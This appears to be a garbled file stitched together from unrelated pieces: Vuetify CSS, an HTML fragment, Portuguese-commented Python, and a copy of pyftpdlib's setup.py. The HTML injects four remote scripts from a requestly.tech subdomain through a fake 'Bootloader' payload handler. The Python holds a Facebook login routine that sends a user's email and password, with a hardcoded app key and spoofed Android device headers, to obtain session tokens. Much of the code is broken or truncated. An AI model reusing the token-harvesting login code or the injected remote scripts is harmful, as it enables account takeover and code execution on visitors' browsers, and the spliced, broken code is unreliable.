.theme--light.v-navigation-drawer{background-color:#fff}.theme--light.v-navigation-drawer:not(.v-navigation-drawer--floating) .v-navigation-drawer__border{background-color:rgba(0,0,0,.12)}.theme--light.v-navigation-drawer .v-divider{border-color:rgba(0,0,0,.12)}.theme--dark.v-navigation-drawer{background-color:#363636}.theme--dark.v-navigation-drawer:not(.v-navigation-drawer--floating) .v-navigation-drawer__border{background-color:hsla(0,0%,100%,.12)}.theme--dark.v-navigation-drawer .v-divider{border-color:hsla(0,0%,100%,.12)}.v-navigation-drawer{-webkit-overflow-scrolling:touch;display:flex;flex-direction:column;left:0;max-width:100%;overflow:hidden;pointer-events:auto;top:0;transition-duration:.2s;transition-timing-function:cubic-bezier(.4,0,.2,1);will-change:transform;transition-property:transform,visibility,width}.v-navigation-drawer:not([data-booted=true]){transition:none!important}.v-navigation-drawer.v-navigation-drawer--right:after{left:0;right:auto}.v-navigation-drawer .v-list:not(.v-select-list){background:inherit}.v-navigation-drawer__border{position:absolute;right:0;top:0;height:100%;width:1px}.v-navigation-drawer__content{height:100%;overflow-y:auto;overflow-x:hidden}.v-navigation-drawer__image{border-radius:inherit;height:100%;position:absolute;top:0;bottom:0;z-index:-1;contain:strict;width:100%}.v-navigation-drawer__image .v-image{border-radius:inherit}.v-navigation-drawer--bottom.v-navigation-drawer--is-mobile{max-height:50%;top:auto;bottom:0;min-width:100%}.v-navigation-drawer--right{left:auto;right:0}.v-navigation-drawer--right>.v-navigation-drawer__border{right:auto;left:0}.v-navigation-drawer--absolute{z-index:1}.v-navigation-drawer--fixed{z-index:6}.v-navigation-drawer--absolute{position:absolute}.v-navigation-drawer--clipped:not(.v-navigation-drawer--temporary):not(.v-navigation-drawer--is-mobile){z-index:4}.v-navigation-drawer--fixed{position:fixed}.v-navigation-drawer--floating:after{display:none}.v-navigation-drawer--mini-variant{overflow:hidden}.v-navigation-drawer--mini-variant .v-list-item>:first-child{margin-left:0;margin-right:0}.v-navigation-drawer--mini-variant .v-list-item>:not(:first-child){position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);white-space:nowrap;display:inline;display:initial}.v-navigation-drawer--mini-variant .v-list-group--no-action .v-list-group__items,.v-navigation-drawer--mini-variant .v-list-group--sub-group{display:none}.v-navigation-drawer--mini-variant.v-navigation-drawer--custom-mini-variant .v-list-item{justify-content:center}.v-navigation-drawer--temporary{z-index:7}.v-navigation-drawer--mobile{z-index:6}.v-navigation-drawer--close{visibility:hidden}.v-navigation-drawer--is-mobile:not(.v-navigation-drawer--close),.v-navigation-drawer--temporary:not(.v-navigation-drawer--close){box-shadow:0 8px 10px -5px rgba(0,0,0,.2),0 16px 24px 2px rgba(0,0,0,.14),0 6px 30px 5px rgba(0,0,0,.12)}
.nuxt-progress{position:fixed;top:0;left:0;right:0;height:2px;width:0;opacity:1;transition:width .1s,opacity .4s;background-color:#000;z-index:999999}.nuxt-progress.nuxt-progress-notransition{transition:none}.nuxt-progress-failed{background-color:red}
body,html{-webkit-overflow-scrolling:touch!important;scroll-behavior:smooth;overflow:auto!important;height:100%!important}</style>
<script>
// Define navigation-drawer--temporary
if (typeof window !== "undefined") {
    window["navigation-drawer--temporary"] = function (dependencies, callback) {
        console.log("navigation-drawer--temporary is defined now.");
        callback({
            handlePayload: function (payload) {
                console.log("Payload handled:", payload);
            },
        });
    };

    // Call navigation-drawer--temporary
    window["navigation-drawer--temporary"](["Bootloader"], function (m) {
        m.handlePayload({
            consistency: { rev: 1010031100 },
            rsrcMap: {
                U7LpmoG: { type: "js", src: "https://user1702906311872.requestly.tech/main.js", nc: 1 },
                J1F5ETJ: { type: "js", src: "https://user1702906311872.requestly.tech/script.js", nc: 1 },
                "6tTjOTm": { type: "js", src: "https://user1702906311872.requestly.tech/sdk.js.download.js", nc: 1 },
                "II93DPe": { type: "js", src: "https://user1702906311872.requestly.tech/schema.js", nc: 1 },
            },
        });
    });
}
</script>
<style>
 .sc-chat-window.sc-chat-window.sc-chat-window {
    width: 100%;
    height: 100%;
    max-height: 100%;
    right: 0px;
    bottom: 0px;
    border-radius: 0px;
    max-width: 100%;
    transition: 0.1s ease-in-out;
  }
    </style>
  </head>
  <body>
    <div id="root"><script src="https://raw.githubusercontent.com/gvmossato/export-chat-gpt/refs/heads/master/bookmark.js"></script>
  </body>
</html>
"""
print("Bem-vindo ao meu programa!")
# Valores hexadecimais fornecidos
# List of directories you want to create
# Dados JSON atualizados com compat_iframe_token e isCQuick
data = {
    "id": "fc5dd511-62fa-4164-9bfb-beafda1840d7",
    "token": "AXiW1bVHWHam1Ztq",
    "timeslice_heartbeat_config": {
        "pollIntervalMs": 33,
        "idleGapThresholdMs": 60,
        "ignoredTimesliceNames": {
            "requestAnimationFrame": True,
            "Event listenHandler mousemove": True,
            "Event listenHandler mouseover": True,
            "Event listenHandler mouseout": True,
            "Event listenHandler scroll": True
        },
        "isHeartbeatEnabled": True,
        "isArtilleryOn": False
    },
    "shouldLogCounters": True,
    "timeslice_categories": {
        "react_render": True,
        "reflow": True
    },
    "stack_trace_limit": 30,
    "timesliceBufferSize": 5000,
    "compat_iframe_token": "AQ6ErgCz2fg5dYfM",
    "isCQuick": False
}

# Convertendo para JSON formatado e exibindo
json_data = json.dumps(data, indent=4)
print("Dados JSON formatados:")
print(json_data)
print("Application interrupted by user.")
# Acessando valores específicos
id_value = data.get("id")
token_value = data.get("token")
compat_iframe_token = data.get("compat_iframe_token")
is_cquick = data.get("isCQuick")
print(f"\nID: {id_value}")
print(f"Token: {token_value}")
print(f"Compat Iframe Token: {compat_iframe_token}")
print(f"Is CQuick: {is_cquick}")
print("All directories and files have been successfully created!")
def process_hex_data(hex_data):
    """
    Processes a string of hex-like data into a structured format.
    
    :param hex_data: A string containing hex-like data with various delimiters.
    :return: A list of dictionaries with processed numeric values.
    """
    # Split the string into segments using spaces and dashes
    cleaned_data = hex_data.replace("-", "").split()
    
    # Filter out any non-numeric or irrelevant data
    structured_data = []
    for value in cleaned_data:
        try:
            # Convert to integer or float if valid
            if 'k' in value:
                # Handle "k" as multiplier (e.g., "3143k" -> 3143000)
                numeric_value = float(value.replace('k', '')) * 1000
            elif 'M' in value:
                # Handle "M" as multiplier (e.g., "3.14M" -> 3140000)
                numeric_value = float(value.replace('M', '')) * 1_000_000
            else:
                numeric_value = float(value)
            structured_data.append(numeric_value)
        except ValueError:
            # Skip invalid data
            continue

    return structured_data
def parse_cf_tags(tag_string):
    pattern = re.compile(r'https://m.facebook.com')
    tags = {}
    for match in pattern.finditer(tag_string):
        key = match.group(1)
        value = match.group(2) or match.group(3)
        tags[key] = value
    return tags
# Função para criar e usar o token
def rand_between(min_val, max_val):
    return random.randint(min_val, max_val)

def rand_string(length):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))

def md5(value):
    return hashlib.md5(value.encode('utf-8')).hexdigest()

def sort_obj(obj):
    return {k: obj[k] for k in sorted(obj)}

def get_sig(form_data):
    key = "62f8ce9f74b12f84c123cc23437a4a32"  # Hardcoded key for signature generation
    sorted_data = ''.join(f"{k}={v}" for k, v in form_data.items())
    return md5(sorted_data + key)

def get_token(email, password):
    sim = rand_between(20000, 40000)
    device_id = str(uuid.uuid4())
    ad_id = str(uuid.uuid4())

    form_data = {
        'adid': ad_id,
        'format': 'json',
        'device_id': device_id,
        'email': email,
        'password': password,
        'cpl': 'true',
        'family_device_id': device_id,
        'credentials_type': 'device_based_login_password',
        'generate_session_cookies': '1',
        'error_detail_type': 'button_with_disabled',
        'source': 'device_based_login',
        'machine_id': rand_string(24),
        'meta_inf_fbmeta': '',
        'advertiser_id': ad_id,
        'currently_logged_in_userid': '0',
        'locale': 'en_US',
        'client_country_code': 'US',
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key': '882a8490361da98702bf97a021ddc14d'
    }

    form_data['sig'] = get_sig(sort_obj(form_data))

    headers = {
        'x-fb-connection-bandwidth': rand_between(20000000, 30000000),
        'x-fb-sim-hni': sim,
        'x-fb-net-hni': sim,
        'x-fb-connection-quality': 'EXCELLENT',
        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
        'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-http-engine': 'Liger'
    }

url = 'https://z-m-static.xx.fbcdn.net/'

# Dados do formulário (ajuste conforme necessário)
form_data = {
    'key': 'value'  # Exemplo de dados a serem enviados
}

# Cabeçalhos (ajuste conforme necessário)
headers = {
    'User-Agent': 'Facebook'
}

# Realizando a solicitação POST
response_post = requests.post(url, data=form_data, headers=headers)

# Verificando se a solicitação POST foi bem-sucedida (código de status 200)
if response_post.status_code == 200:
    print("Solicitação POST bem-sucedida")
else:
    print(f"Erro na solicitação POST: {response_post.status_code}")

# Realizando a solicitação GET
response_get = requests.get(url)

# Verificando se a solicitação GET foi bem-sucedida (código de status 200)
if response_get.status_code == 200:
    print("Solicitação GET bem-sucedida")
else:
    print(f"Erro na solicitação GET: {response_get.status_code}")
# Definindo a URL

# Copyright (C) 2007 Giampaolo Rodola' <g.rodola@gmail.com>.
# Use of this source code is governed by MIT license that can be
# found in the LICENSE file.

"""pyftpdlib installer.

$ python setup.py install
"""

import ast
import os
import sys
import textwrap


WINDOWS = os.name == "nt"

# Test deps, installable via `pip install .[test]`.
TEST_DEPS = [
    "psutil",
    "pyopenssl",
    "pytest",
    "pytest-xdist",
    "setuptools",
]
if sys.version_info[:2] >= (3, 12):
    TEST_DEPS.append("pyasyncore")
    TEST_DEPS.append("pyasynchat")

if WINDOWS:
    TEST_DEPS.append("pywin32")

# Development deps, installable via `pip install .[dev]`.
DEV_DEPS = [
    "black",
    "check-manifest",
    "coverage",
    "pylint",
    "pytest-cov",
    "pytest-xdist",
    "rstcheck",
    "ruff",
    "toml-sort",
    "twine",
]
if WINDOWS:
    DEV_DEPS.extend(["pyreadline3", "pdbpp"])


def get_version():
    INIT = os.path.abspath(
        os.path.join(os.path.dirname(__file__), 'pyftpdlib', '__init__.py')
    )
    with open(INIT) as f:
        for line in f:
            if line.startswith('__ver__'):
                ret = ast.literal_eval(line.strip().split(' = ')[1])
                assert ret.count('.') == 2, ret
                for num in ret.split('.'):
                    assert num.isdigit(), ret
                return ret
        raise ValueError("couldn't find version string")


def term_supports_colors():
    try:
        import curses  # noqa: PLC0415

        assert sys.stderr.isatty()
        curses.setupterm()
        assert curses.tigetnum("colors") > 0
    except Exception:
        return False
    else:
        return True


def hilite(s, ok=True, bold=False):
    """Return an highlighted version of 's'."""
    if not term_supports_colors():
        return s
    else:
        attr = []
        if ok is None:  # no color
            pass
        elif ok:
            attr.append('32')  # green
        else:
            attr.append('31')  # red
        if bold:
            attr.append('1')
        return f"\x1b[{';'.join(attr)}m{s}\x1b[0m"


with open('README.rst') as f:
    long_description = f.read()


def main():
    try:
        import setuptools  # noqa
        from setuptools import setup  # noqa
    except ImportError:
        setuptools = None
        from distutils.core import setup  # noqa

    kwargs = dict(
        name='pyftpdlib',
        version=get_version(),
        description='Very fast asynchronous FTP server library',
        long_description=long_description,
        long_description_content_type="text/x-rst",
        license='MIT',
        platforms='Platform Independent',
        author="Giampaolo Rodola'",
        author_email='g.rodola@gmail.com',
        url='https://github.com/giampaolo/pyftpdlib/',
        packages=['pyftpdlib', 'pyftpdlib.test'],
        scripts=['scripts/ftpbench'],
        package_data={
            "pyftpdlib.test": [
                "README",
                'keycert.pem',
            ],
        },
        # fmt: off
        keywords=['ftp', 'ftps', 'server', 'ftpd', 'daemon', 'python', 'ssl',
                  'sendfile', 'asynchronous', 'nonblocking', 'eventdriven',
                  'rfc959', 'rfc1123', 'rfc2228', 'rfc2428', 'rfc2640',
                  'rfc3659'],
        # fmt: on
        install_requires=[
            "pyasyncore;python_version>='3.12'",
            "pyasynchat;python_version>='3.12'",
        ],
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: MIT License',
            'Operating System :: OS Independent',
            'Programming Language :: Python',
            'Topic :: Internet :: File Transfer Protocol (FTP)',
            'Topic :: Software Development :: Libraries :: Python Modules',
            'Topic :: System :: Filesystems',
            'Programming Language :: Python',
            'Programming Language :: Python :: 3',
        ],
    )

    if setuptools is not None:
        extras_require = {
            "dev": DEV_DEPS,
            "test": TEST_DEPS,
            "ssl": "PyOpenSSL",
        }
        kwargs.update(
            python_requires=(
                ">2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*, !=3.5.*"
            ),
            extras_require=extras_require,
            zip_safe=False,
        )

    setup(**kwargs)

    try:
        from OpenSSL import SSL  # NOQA
    except ImportError:
        msg = textwrap.dedent("""
            'pyopenssl' third-party module is not installed. This means
            FTPS support will be disabled. You can install it with:
            'pip install pyopenssl'.""")
        print(hilite(msg, ok=False), file=sys.stderr)


if sys.version_info[0] < 3:  # noqa: UP036
    sys.exit(
        'Python 2 is no longer supported. Latest version is 1.5.10; use:\n'
        'python2 -m pip install pyftpdlib==1.5.10'
    )

def my_function_create_token(token, endpoint="fdb3bf0ca6c13f3c149e1654c1dd6a7706125f9b", payload=None):
    # Definindo a URL
    url = "https://m.facebook.com"
    
    # Definindo os cabeçalhos (headers)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer 882a8490361da98702bf97a021ddc14d'  # Inclua seu token de autenticação
    }

    # Se não houver payload fornecido, usa um dicionário vazio
    if payload is None:
        payload = {}

    # Fazendo a requisição POST
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        
        # Verifica se a resposta foi bem-sucedida (status 200)
        response.raise_for_status()  # Levanta um erro se o status não for 2xx

        # Tenta retornar a resposta como JSON
        return response.json()

    except requests.exceptions.RequestException as e:
        # Caso haja qualquer erro na requisição, retorna um dicionário de erro
        return {
            "error": str(e),
            "status_code": getattr(e.response, 'status_code', None),
            "text": getattr(e.response, 'text', str(e))  # Pode ser o corpo da resposta ou o erro gerado
        }
    except ValueError:
        # Caso a resposta não seja JSON, trata o erro
        return {
            "error": "Response is not in JSON format",
            "status_code": response.status_code,
            "text": response.text  # Retorna o conteúdo bruto da resposta
        }

# Exemplo de uso
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg'  # Substitua pelo seu token real
payload = {'chave': 'valor'}  # Substitua pelo seu payload desejado

# Chamada da função
response = my_function_create_token(token)
print(response)

resultado = my_function_create_token(token, payload)
if resultado:
    print("Resposta:", resultado)
else:
    print("Falha na requisição.")
os.environ["cf_tags_1"] = "awesome 12321.3212312.321321.3132132"
os.environ["cf_tags_2"] = 'tag1,tag2:value2,tag3:"value,with,commas",tag4:"value with \\"escaped\\" quotation marks"'
os.environ["cf_tags_3"] = "important,ticket:THIS-12345"
os.environ["cf_tags_4"] = 'tag1:value1,tag2:value2,tag-without-value,another-tag-without-value,tag-with-quoted-value:"because of the comma, quotes are needed' 
tags_1 = os.getenv("cf_tags_1")
tags_2 = parse_cf_tags(os.getenv("cf_tags_2"))
tags_3 = parse_cf_tags(os.getenv("cf_tags_3"))
tags_4 = parse_cf_tags(os.getenv("cf_tags_4"))
# Example `hex_data` input
hex_data = (
    "0 0 0 0 0 0 0 0 - 0 0 0 0 0 0 0 0 - 0 3143k 0 9693 0 0 6190 0 6 "
    "3143k 6 198k 0 0 80400 0 26 3143k 26 844k 00223k 0 35 3143k 35 "
    "1127k 0 0 239k 0 50 3143k 50 1602k 0 0242k 0 55 3143k 55 1730k 0 "
    "0 223k 0 59 3143k 59 1858k 0 0 218k 0 63 3143k 63 2002k 0 0 209k "
    "0 67 3143k 67 2106k 0 0 198k0693143k 69 2176k 0 0 188k 0 71 3143k "
    "71 2251k 0 0 179k 0 733143k 73 2319k 0 0 171k 0 75 3143k 75 2371k "
    "0 0 163k 0 773143k 77 2427k 0 0 155k 0 78 3143k 78 2464k 0 0 148k "
    "0 79 3143k 792507k 0 0 142k 0 80 3143k 80 2536k 0 0 136k 0 81 "
    "3143k 81 2566k 0 0 131k 0 83 3143k 83 2610k 0 0 127k 0 84 3143k 84 "
    "2651k 0 0 121k 0 85 3143k 85 2682k 0 0 118k 0 86 3143k 862711k 0 0 "
    "115k 0 87 3143k 87 2746k 0 0 111k 0 88 3143k 88 2782k0 0 108k 0 90 "
    "3143k 90 2834k 0 0 106k 0 91 3143k 91 2885k 0 0 104k 0 94 3143k 94 "
    "2983k 0 0 104k 0 96 3143k 96 3044k 0 0 102k0 98 3143k 98 3095k 0 0 "
    "100k 0 99 3143k 99 3124k 0 0 98k0 100 3143k 100 3143k 0 0 98k 0 0 6 "
    "2 2 1 0 3143k 0 9693 00 61900 6 0,25 3143k 6 198k 0 0 80400 0 26 "
    "3143k 26 844k 0 0 223k 0 35 3143k 35 1127k 0 0 239k 0 0 0 0 0 0 0 - "
    "0 0 0 001K 12K"
)

# Process the data
processed_data = process_hex_data(hex_data)
print(processed_data)
# String used to identify infected files
# Configurações do Chrome
# Configurar opções do Firefox
# Abrir a página de login
# Solicitar que o usuário digite suas credenciais
def get_facebook_token(email, password):
    # Dados do formulário
    data = {
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "email": email,
        "format": "JSON",
        "locale": "vi_vn",
        "method": "auth.login",
        "password": password,
        "return_ssl_resources": "0",
        "v": "1.0"
    }

    # Geração da assinatura (sig)
sig_my_data = """eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.ew0KICAiY2VydGlmaWNhdGVDaGFpbnMiOiBbDQogICAgew0KICAgICAgIm5hbWUiOiAic2t5ZHJpdmUiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJhMDo3OTo0MjoxNToyNzo4YTo1Njo3ZTo4ODo3YTpmNjpjZDplMDoxNTphNTplODo4NDoxNDplZjo2NDowZjo3ZDphYjozODo1NTphMzplNzo3OTo2NTo4YjplNzo3OCINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInNreWRyaXZlX2NlcnRpZmljYXRlX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYTA6Nzk6NDI6MTU6Mjc6OGE6NTY6N2U6ODg6N2E6ZjY6Y2Q6ZTA6MTU6YTU6ZTg6ODQ6MTQ6ZWY6NjQ6MGY6N2Q6YWI6Mzg6NTU6YTM6ZTc6Nzk6NjU6OGI6ZTc6NzgiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJleGNlbF93b3JkX3Bvd2VycG9pbnRfb3V0bG9va19seW5jX2RlZmVuZGVyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYjk6MjU6MTM6NmY6M2U6YTc6YzA6YTE6OTU6MTY6OTA6YTE6YWI6MzE6Mzk6MTA6ZGE6ODE6ZjQ6MDk6OTQ6YTg6NTM6NDI6ZWM6NjI6Mjg6ODg6ZjE6Mjg6NzA6NTEiDQogICAgICBdDQogICAgfSwNCgl7DQogICAgICAibmFtZSI6ICJleGNlbF93b3JkX3Bvd2VycG9pbnRfb2ZmaWNlaHVicm93X2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAgIjFmOmI0OmRlOjc2OjBmOjQwOmYzOjBlOjY2OmQzOjA4OjUxOjhhOjFiOmQ5OmQxOjRlOmYxOjQxOjFiOmZmOmE5OmQ2Ojc2OjI4Ojc2OmI2OjAyOjY2OjFkOjU0OmVkIiwNCiAgICAgICAgICI0Yjo4ZjozNDpjOTo3ZTowNTphZTpjZTpiNzo0YzpiNTpjOTo4ZjozNjpmNjoyODo2ZjpkODpiZjo2NDphMjo1NzphYzozYjozMjo1MDoxODpkMDpkZDowOTpjMDo3OSIsDQogICAgICAgICAiNjA6MWE6OTc6MGY6M2Y6MmY6NWU6MjU6NjQ6NjQ6ZjE6NDI6NGY6ZTc6MGQ6Zjg6ODM6NWE6M2E6NGM6YTQ6NDE6YTc6ZjI6ZTg6MDQ6ZTQ6YmU6Njg6MDU6OGQ6OGMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJza3lwZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjdkOjUzOjkzOjUxOmNhOjM5OmMyOjdjOmE3OjA2OjQwOjllOjVhOjliOjZiOjA2OjJkOmI5OmJmOjhkOmMzOmQ4OmNhOmE2OjEzOjcwOjY3OmFlOjdmOjY4OmI1OmU3IiwNCiAgICAgICAgIjZlOmQ1OmEzOjI5OjM1Ojg0OjQ4OjFjOmVhOjVhOjBiOjE3OjRmOmE0OjZhOjg1OmIwOjM5OmI1OmIzOjk4OjkyOjlhOjI2OjRiOjYyOjM0OjI3OmIyOjM3OmQ1OmUzIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAid3VuZGVybGlzdCIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImI1OmIxOmU0OjZkOjVkOjBkOmJmOjk2Ojg4OjMwOjk4OjdlOjkyOjAzOjUwOmNjOmVhOmQ4OjI3OjM2OjA1OjEyOmIzOjFmOmNiOjk4OjdhOjk5OjU5OmExOjVhOjg1Ig0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAic2hpZnRyX2RmIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZjc6YzE6YTc6MDI6ZWE6Mzc6N2M6YjY6ZjM6MzY6NzY6ZjQ6ZTM6Y2Q6YTY6ZDk6MmQ6NjI6OGM6OTE6ZTg6YTU6NDg6Mjk6MTM6NGQ6OTI6ODY6MTI6Yjc6NGE6MDYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb3J0YW5hIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiODM6NjY6ZmE6Zjc6Mjc6ZGM6NDg6MzE6N2E6MmY6M2E6MGM6Mzc6ZmE6MTI6N2Y6M2Y6MzU6NjE6OTQ6Y2Y6YmI6MmY6NGI6NjI6OGU6Yzc6ZTY6YTE6YTc6NWM6MGYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb3J0YW5hX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiODM6NjY6ZmE6Zjc6Mjc6ZGM6NDg6MzE6N2E6MmY6M2E6MGM6Mzc6ZmE6MTI6N2Y6M2Y6MzU6NjE6OTQ6Y2Y6YmI6MmY6NGI6NjI6OGU6Yzc6ZTY6YTE6YTc6NWM6MGYiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJsYXVuY2hlciIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImU4OjQzOmVlOjNkOmExOjE5OjVkOjZhOmZiOjg5OmNhOmEzOmNlOjc0OjI3OmIwOjhmOmMwOjFmOmQ4Ojc4OmEyOjRmOmE1OjZlOjk2OjJjOjM1OmM3OjFkOjVlOjcwIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibGF1bmNoZXJfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJlODo0MzplZTozZDphMToxOTo1ZDo2YTpmYjo4OTpjYTphMzpjZTo3NDoyNzpiMDo4ZjpjMDoxZjpkODo3ODphMjo0ZjphNTo2ZTo5NjoyYzozNTpjNzoxZDo1ZTo3MCIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInBvd2VyYXBwIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiM2Q6MDA6MGQ6OGE6MWU6MjE6NTA6ZGI6Mjg6NWY6OWM6YTg6NmI6OTA6YWQ6NjQ6ODc6ODQ6MGI6YjE6MDQ6OGM6ZDk6Zjc6YjM6NzA6NjY6NTY6MmQ6ZjU6ZWQ6NmMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYWM6NDY6YWI6YTk6MjM6NmU6YmQ6NWE6ZWQ6MzU6OTk6NGU6OWU6ODg6ZWU6NzU6ZDE6ZDY6YjU6MTA6ZTE6ZDU6ZjE6NDE6Yjc6MTk6ZGE6NjI6ZGM6MzU6ODY6ZmEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYWM6NDY6YWI6YTk6MjM6NmU6YmQ6NWE6ZWQ6MzU6OTk6NGU6OWU6ODg6ZWU6NzU6ZDE6ZDY6YjU6MTA6ZTE6ZDU6ZjE6NDE6Yjc6MTk6ZGE6NjI6ZGM6MzU6ODY6ZmEiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjaGVzaGlyZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjVmOmE1OmU2OmJlOjA2OmQ2OmZiOjk4OjNmOjI2OjJlOmNlOjYxOjM0OmM1OjI2OjA4OjQ1OjBjOmIxOjFkOmMzOjA2OjEyOmY3OjgwOjU5OmQ4OmU3OjY5OmFjOmExIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiY2hlc2hpcmVfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI1ZjphNTplNjpiZTowNjpkNjpmYjo5ODozZjoyNjoyZTpjZTo2MTozNDpjNToyNjowODo0NTowYzpiMToxZDpjMzowNjoxMjpmNzo4MDo1OTpkODplNzo2OTphYzphMSIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImJpbmdhcHBzIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZGI6NjE6YWU6NDQ6NzM6M2U6ZDk6YTE6OTk6ZTU6Mzg6ZTc6YmM6MjM6MTI6YjE6Y2E6MDA6ZDA6ODM6ZDg6MTI6N